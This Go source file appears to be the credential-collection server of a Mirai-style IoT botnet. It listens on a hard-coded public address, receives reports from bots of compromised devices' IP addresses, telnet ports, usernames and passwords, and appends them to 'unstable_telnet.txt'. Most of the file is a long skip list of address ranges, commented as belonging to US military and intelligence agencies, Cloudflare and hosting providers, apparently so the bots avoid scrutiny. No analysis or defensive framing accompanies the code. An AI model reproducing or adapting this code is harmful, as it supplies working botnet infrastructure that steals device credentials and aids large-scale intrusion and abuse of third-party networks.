package main

import (
    "encoding/binary"
    "errors"
    "fmt"
    "log"
    "net"
    "os"
    "time"
)

func main() {
    l, err := net.Listen("tcp", "138.197.107.160:18819")
    if err != nil {
        fmt.Println(err)
        return
    }

    for {
        conn, err := l.Accept()
        if err != nil {
            break
        }
        go handleConnection(conn)
    }
}



func handleConnection(conn net.Conn) {
    defer conn.Close()
    conn.SetDeadline(time.Now().Add(10 * time.Second))

    bufChk, err := readXBytes(conn, 1)
    if err != nil {
        return
    }

    var ipInt uint32
    var portInt uint16

    if bufChk[0] == 0 {
        ipBuf, err := readXBytes(conn, 4)
        if err != nil {
            return
        }
        ipInt = binary.BigEndian.Uint32(ipBuf)

        portBuf, err := readXBytes(conn, 2)
        if err != nil {
            return
        }

        portInt = binary.BigEndian.Uint16(portBuf)
    } else {
        ipBuf, err := readXBytes(conn, 3)
        if err != nil {
            return
        }
        ipBuf = append(bufChk, ipBuf...)

        ipInt = binary.BigEndian.Uint32(ipBuf)

        portInt = 23
    }

    uLenBuf, err := readXBytes(conn, 1)
    if err != nil {
        return
    }
    usernameBuf, err := readXBytes(conn, int(byte(uLenBuf[0])))

    pLenBuf, err := readXBytes(conn, 1)
    if err != nil {
        return
    }

    passwordBuf, err := readXBytes(conn, int(byte(pLenBuf[0])))
    if err != nil {
        return
    }
    var o1 uint32
    var o2 uint32
    var o3 uint32
    //var o4 uint32

    o1 = (ipInt >> 24) & 0xff
    o2 = (ipInt >> 16) & 0xff
    o3 = (ipInt >> 8) & 0xff
    //o4 = ipInt & 0xff

    if o1 == 127 {
        return
    }
    if o1 == 0 {
        return
    }
    if o1 == 3 {
        return
    }
    if o1 == 15 {
        return
    }
    if o1 == 56 {
        return
    }
    if o1 == 10 {
        return
    }
    if o1 == 25 {
        return
    }
    if o1 == 49 {
        return
    }
    if o1 == 50 {
        return
    }
    if o1 == 137 {
        return
    }
    // Department of Defense
    if o1 == 6 {
        return
    }
    if o1 == 7 {
        return
    }
    if o1 == 11 {
        return
    }
    if o1 == 21 {
        return
    }
    if o1 == 22 {
        return
    }
    if o1 == 26 {
        return
    }
    if o1 == 28 {
        return
    }
    if o1 == 29 {
        return
    }
    if o1 == 30 {
        return
    }
    if o1 == 33 {
        return
    }
    if o1 == 55 {
        return
    }
    if o1 == 214 {
        return
    }
    if o1 == 215 {
        return
    }
    // End of Department of Defense
    if o1 == 192 && o2 == 168 {
        return
    }
    if o1 == 146 && o2 == 17 {
        return
    }
    if o1 == 146 && o2 == 80 {
        return
    }
    if o1 == 146 && o2 == 98 {
        return
    }
    if o1 == 146 && o2 == 154 {
        return
    }
    if o1 == 147 && o2 == 159 {
        return
    }
    if o1 == 148 && o2 == 114 {
        return
    }
    if o1 == 150 && o2 == 125 {
        return
    }
    if o1 == 150 && o2 == 133 {
        return
    }
    if o1 == 150 && o2 == 144 {
        return
    }
    if o1 == 150 && o2 == 149 {
        return
    }
    if o1 == 150 && o2 == 157 {
        return
    }
    if o1 == 150 && o2 == 184 {
        return
    }
    if o1 == 150 && o2 == 190 {
        return
    }
    if o1 == 150 && o2 == 196 {
        return
    }
    if o1 == 152 && o2 == 82 {
        return
    }
    if o1 == 152 && o2 == 229 {
        return
    }
    if o1 == 157 && o2 == 202 {
        return
    }
    if o1 == 157 && o2 == 217 {
        return
    }
    if o1 == 161 && o2 == 124 {
        return
    }
    if o1 == 162 && o2 == 32 {
        return
    }
    if o1 == 155 && o2 == 96 {
        return
    }
    if o1 == 155 && o2 == 149 {
        return
    }
    if o1 == 155 && o2 == 155 {
        return
    }
    if o1 == 155 && o2 == 178 {
        return
    }
    if o1 == 164 && o2 == 158 {
        return
    }
    if o1 == 156 && o2 == 9 {
        return
    }
    if o1 == 167 && o2 == 44 {
        return
    }
    if o1 == 168 && o2 == 68 {
        return
    }
    if o1 == 168 && o2 == 85 {
        return
    }
    if o1 == 168 && o2 == 102 {
        return
    }
    if o1 == 203 && o2 == 59 {
        return
    }
    if o1 == 204 && o2 == 34 {
        return
    }
    if o1 == 207 && o2 == 30 {
        return
    }
    if o1 == 117 && o2 == 55 {
        return
    }
    if o1 == 117 && o2 == 56 {
        return
    }
    if o1 == 80 && o2 == 235 {
        return
    }
    if o1 == 207 && o2 == 120 {
        return
    }
    if o1 == 209 && o2 == 35 {
        return
    }
    if o1 == 64 && o2 == 70 {
        return
    }
    if o1 == 172 && o2 >= 16 && o2 < 32 {
        return
    }
    if o1 == 100 && o2 >= 64 && o2 < 127 {
        return
    }
    if o1 == 169 && o2 > 254 {
        return
    }
    if o1 == 198 && o2 >= 18 && o2 < 20 {
        return
    }
    if o1 == 64 && o2 >= 69 && o2 < 227 {
        return
    }
    if o1 == 128 && o2 >= 35 && o2 < 237 {
        return
    }
    if o1 == 129 && o2 >= 22 && o2 < 255 {
        return
    }
    if o1 == 130 && o2 >= 40 && o2 < 168 {
        return
    }
    if o1 == 131 && o2 >= 3 && o2 < 251 {
        return
    }
    if o1 == 132 && o2 >= 3 && o2 < 251 {
        return
    }
    if o1 == 134 && o2 >= 5 && o2 < 235 {
        return
    }
    if o1 == 136 && o2 >= 177 && o2 < 223 {
        return
    }
    if o1 == 138 && o2 >= 13 && o2 < 194 {
        return
    }
    if o1 == 139 && o2 >= 31 && o2 < 143 {
        return
    }
    if o1 == 140 && o2 >= 1 && o2 < 203 {
        return
    }
    if o1 == 143 && o2 >= 45 && o2 < 233 {
        return
    }
    if o1 == 144 && o2 >= 99 && o2 < 253 {
        return
    }
    if o1 == 146 && o2 >= 165 && o2 < 166 {
        return
    }
    if o1 == 147 && o2 >= 35 && o2 < 43 {
        return
    }
    if o1 == 147 && o2 >= 103 && o2 < 105 {
        return
    }
    if o1 == 147 && o2 >= 168 && o2 < 170 {
        return
    }
    if o1 == 147 && o2 >= 198 && o2 < 200 {
        return
    }
    if o1 == 147 && o2 >= 238 && o2 < 255 {
        return
    }
    if o1 == 150 && o2 >= 113 && o2 < 115 {
        return
    }
    if o1 == 152 && o2 >= 151 && o2 < 155 {
        return
    }
    if o1 == 153 && o2 >= 21 && o2 < 32 {
        return
    }
    if o1 == 155 && o2 >= 5 && o2 < 10 {
        return
    }
    if o1 == 155 && o2 >= 74 && o2 < 89 {
        return
    }
    if o1 == 155 && o2 >= 213 && o2 < 222 {
        return
    }
    if o1 == 157 && o2 >= 150 && o2 < 154 {
        return
    }
    if o1 == 158 && o2 >= 1 && o2 < 21 {
        return
    }
    if o1 == 158 && o2 >= 235 && o2 < 247 {
        return
    }
    if o1 == 159 && o2 >= 120 && o2 < 121 {
        return
    }
    if o1 == 160 && o2 >= 132 && o2 < 151 {
        return
    }
    if o1 == 64 && o2 >= 224 && o2 < 227 {
        return
    }
    // CIA
    if o1 == 162 && o2 >= 45 && o2 < 47 {
        return
    }
    // NASA Kennedy Space Center
    if o1 == 163 && o2 >= 205 && o2 < 207 {
        return
    }
    if o1 == 164 && o2 >= 45 && o2 < 50 {
        return
    }
    if o1 == 164 && o2 >= 217 && o2 < 233 {
        return
    }
    // U.S. Department of State
    if o1 == 169 && o2 >= 252 && o2 < 254 {
        return
    }
    // Naval Air Systems Command, VA
    if o1 == 199 && o2 >= 121 && o2 < 254 {
        return
    }
    // Department of the Navy, Space and Naval Warfare System Command, Washington DC - SPAWAR
    if o1 == 205 && o2 >= 1 && o2 < 118 {
        return
    }
    // FBI controlled Linux servers & IPs/IP-Ranges
    if o1 == 207 && o2 >= 60 && o2 < 62 {
        return
    }
    // Cloudflare
    if o1 == 104 && o2 >= 16 && o2 < 31 {
        return
    }

    // Digital Ocean
    if o1 == 188 && o2 == 166 {
        return
    }
    if o1 == 188 && o2 == 226 {
        return
    }
    if o1 == 159 && o2 == 203 {
        return
    }
    if o1 == 162 && o2 == 243 {
        return
    }
    if o1 == 45 && o2 == 55 {
        return
    }
    if o1 == 178 && o2 == 62 {
        return
    }
    if o1 == 104 && o2 == 131 {
        return
    }
    if o1 == 104 && o2 == 236 {
        return
    }
    if o1 == 107 && o2 == 170 {
        return
    }
    if o1 == 138 && o2 == 197 {
        return
    }
    if o1 == 138 && o2 == 68 {
        return
    }
    if o1 == 139 && o2 == 59 {
        return
    }

    if o1 == 146 && o2 == 185 && o3 >= 128 && o3 < 191 {
        return
    }
    if o1 == 163 && o2 == 47 && o3 >= 10 && o3 < 11 {
        return
    }
    if o1 == 174 && o2 == 138 && o3 >= 1 && o3 < 127 {
        return
    }
    if o1 == 192 && o2 == 241 && o3 >= 128 && o3 < 255 {
        return
    }
    if o1 == 198 && o2 == 199 && o3 >= 64 && o3 < 127 {
        return
    }
    if o1 == 198 && o2 == 211 && o3 >= 96 && o3 < 127 {
        return
    }
    if o1 == 207 && o2 == 154 && o3 >= 192 && o3 < 255 {
        return
    }
    if o1 == 37 && o2 == 139 && o3 >= 1 && o3 < 31 {
        return
    }
    if o1 == 67 && o2 == 207 && o3 >= 64 && o3 < 95 {
        return
    }
    if o1 == 67 && o2 == 205 && o3 >= 128 && o3 < 191 {
        return
    }
    if o1 == 80 && o2 == 240 && o3 >= 128 && o3 < 143 {
        return
    }
    if o1 == 82 && o2 == 196 && o3 >= 1 && o3 < 15 {
        return
    }
    if o1 == 95 && o2 == 85 && o3 >= 8 && o3 < 63 {
        return
    }

    // Choopa & Vultr
    if o1 == 64 && o2 == 237 && o3 >= 32 && o3 < 43 {
        return
    }
    if o1 == 185 && o2 == 92 && o3 >= 220 && o3 < 223 {
        return
    }
    if o1 == 104 && o2 == 238 && o3 >= 128 && o3 < 191 {
        return
    }
    if o1 == 209 && o2 == 222 && o3 >= 1 && o3 < 31 {
        return
    }
    if o1 == 208 && o2 == 167 && o3 >= 232 && o3 < 252 {
        return
    }
    if o1 == 66 && o2 == 55 && o3 >= 128 && o3 < 159 {
        return
    }
    if o1 == 45 && o2 == 63 && o3 >= 1 && o3 < 127 {
        return
    }
    if o1 == 216 && o2 == 237 && o3 >= 128 && o3 < 159 {
        return
    }
    if o1 == 108 && o2 == 61 {
        return
    }
    if o1 == 45 && o2 == 76 {
        return
    }

    // Blazingfast & Nforce
    if o1 == 185 && o2 == 11 && o3 >= 144 && o3 < 148 {
        return
    }
    if o1 == 185 && o2 == 56 && o3 >= 21 && o3 < 23 {
        return
    }
    if o1 == 185 && o2 == 61 && o3 >= 136 && o3 < 139 {
        return
    }
    if o1 == 185 && o2 == 62 && o3 >= 187 && o3 < 191 {
        return
    }
    if o1 == 66 && o2 == 150 && o3 >= 120 && o3 < 215 {
        return
    }
    if o1 == 66 && o2 == 151 && o3 >= 137 && o3 < 139 {
        return
    }
    if o1 == 64 && o2 == 94 && o3 >= 237 && o3 < 255 {
        return
    }
    if o1 == 63 && o2 == 251 && o3 >= 19 && o3 < 21 {
        return
    }
    if o1 == 70 && o2 == 42 && o3 >= 73 && o3 < 75 {
        return
    }
    if o1 == 74 && o2 == 91 && o3 >= 113 && o3 < 115 {
        return
    }
    if o1 == 74 && o2 == 201 && o3 >= 56 && o3 < 58 {
        return
    }
    if o1 == 188 && o2 == 209 && o3 >= 48 && o3 < 53 {
        return
    }

    // OVH
    if o1 == 188 && o2 == 165 {
        return
    }
    if o1 == 149 && o2 == 202 {
        return
    }
    if o1 == 151 && o2 == 80 {
        return
    }
    if o1 == 164 && o2 == 132 {
        return
    }
    if o1 == 176 && o2 == 31 {
        return
    }
    if o1 == 167 && o2 == 114 {
        return
    }
    if o1 == 178 && o2 == 32 {
        return
    }
    if o1 == 178 && o2 == 33 {
        return
    }
    if o1 == 37 && o2 == 59 {
        return
    }
    if o1 == 37 && o2 == 187 {
        return
    }
    if o1 == 46 && o2 == 105 {
        return
    }
    if o1 == 51 && o2 == 254 {
        return
    }
    if o1 == 51 && o2 == 255 {
        return
    }
    if o1 == 5 && o2 == 135 {
        return
    }
    if o1 == 5 && o2 == 196 {
        return
    }
    if o1 == 5 && o2 == 39 {
        return
    }
    if o1 == 91 && o2 == 134 {
        return
    }

    // Total Server Solutions
    if o1 == 104 && o2 == 200 && o3 >= 128 && o3 < 159 {
        return
    }
    if o1 == 107 && o2 == 152 && o3 >= 96 && o3 < 111 {
        return
    }
    if o1 == 107 && o2 == 181 && o3 >= 160 && o3 < 189 {
        return
    }
    if o1 == 172 && o2 == 98 && o3 >= 64 && o3 < 95 {
        return
    }
    if o1 == 184 && o2 == 170 && o3 >= 240 && o3 < 255 {
        return
    }
    if o1 == 192 && o2 == 111 && o3 >= 128 && o3 < 143 {
        return
    }
    if o1 == 192 && o2 == 252 && o3 >= 208 && o3 < 223 {
        return
    }
    if o1 == 192 && o2 == 40 && o3 >= 56 && o3 < 59 {
        return
    }
    if o1 == 198 && o2 == 8 && o3 >= 81 && o3 < 95 {
        return
    }
    if o1 == 199 && o2 == 116 && o3 >= 112 && o3 < 119 {
        return
    }
    if o1 == 199 && o2 == 229 && o3 >= 248 && o3 < 255 {
        return
    }
    if o1 == 199 && o2 == 36 && o3 >= 220 && o3 < 223 {
        return
    }
    if o1 == 199 && o2 == 58 && o3 >= 184 && o3 < 187 {
        return
    }
    if o1 == 206 && o2 == 220 && o3 >= 172 && o3 < 175 {
        return
    }
    if o1 == 208 && o2 == 78 && o3 >= 40 && o3 < 43 {
        return
    }
    if o1 == 208 && o2 == 93 && o3 >= 192 && o3 < 193 {
        return
    }
    if o1 == 66 && o2 == 71 && o3 >= 240 && o3 < 255 {
        return
    }
    if o1 == 98 && o2 == 142 && o3 >= 208 && o3 < 223 {
        return
    }
    // Amazon
    if o1 == 107 && o2 >= 20 && o2 < 24 {
        return
    }
    if o1 == 35 && o2 >= 159 && o2 < 183 {
        return
    }
    if o1 == 52 && o2 >= 1 && o2 < 95 {
        return
    }
    //Amazon + Microsoft
    if o1 == 52 && o2 >= 95 && o2 < 255 {
        return
    }

    if o1 == 54 && o2 >= 64 && o2 < 95 {
        return
    }
    if o1 == 54 && o2 >= 144 && o2 < 255 {
        return
    }
    if o1 == 13 && o2 >= 52 && o2 < 60 {
        return
    }
    if o1 == 13 && o2 >= 112 && o2 < 115 {
        return
    }

    // ONLINE SAS
    if o1 == 163 && o2 == 172 {
        return
    }
    if o1 == 51 && o2 >= 15 && o2 < 255 {
        return
    }
    //Some more
    if o1 == 79 && o2 == 121 && o3 >= 128 && o3 < 255 {
        return
    }
    if o1 == 212 && o2 == 47 && o3 >= 224 && o3 < 255 {
        return
    }
    if o1 == 89 && o2 == 34 && o3 >= 96 && o3 < 97 {
        return
    }

    if o1 == 219 && o2 >= 216 && o2 < 231 {
        return
    }
    if o1 == 23 && o2 >= 94 && o2 < 109 {
        return
    }
    if o1 == 178 && o2 >= 62 && o2 < 63 {
        return
    }
    if o1 == 106 && o2 >= 182 && o2 < 189 {
        return
    }
    if o1 == 34 && o2 >= 245 && o2 < 255 {
        return
    }
    if o1 == 87 && o2 >= 97 && o2 < 99 {
        return
    }
    if o1 == 86 && o2 == 208 {
        return
    }
    if o1 == 86 && o2 == 209 {
        return
    }
    if o1 == 193 && o2 == 164 {
        return
    }
    // Ministry of Education Computer Science
    if o1 == 120 && o2 >= 103 && o2 < 108 {
        return
    }
    //
    if o1 == 188 && o2 == 68 {
        return
    }
    if o1 == 78 && o2 == 46 {
        return
    }
    if o1 >= 224 {
        return
    }
    file, err := os.OpenFile("unstable_telnet.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
    if err != nil {
        log.Fatal("Cannot create file", err)
    }
    defer file.Close()
    fmt.Printf("%d.%d.%d.%d:%d %s:%s\n", (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portInt, string(usernameBuf), string(passwordBuf))

    fmt.Fprintf(file, "%d.%d.%d.%d:%d %s:%s\n", (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portInt, string(usernameBuf), string(passwordBuf))
}

func readXBytes(conn net.Conn, amount int) ([]byte, error) {
    buf := make([]byte, amount)
    tl := 0

    for tl < amount {
        rd, err := conn.Read(buf[tl:])
        if err != nil || rd <= 0 {
            return nil, errors.New("Failed to read")
        }
        tl += rd
    }

    return buf, nil
}
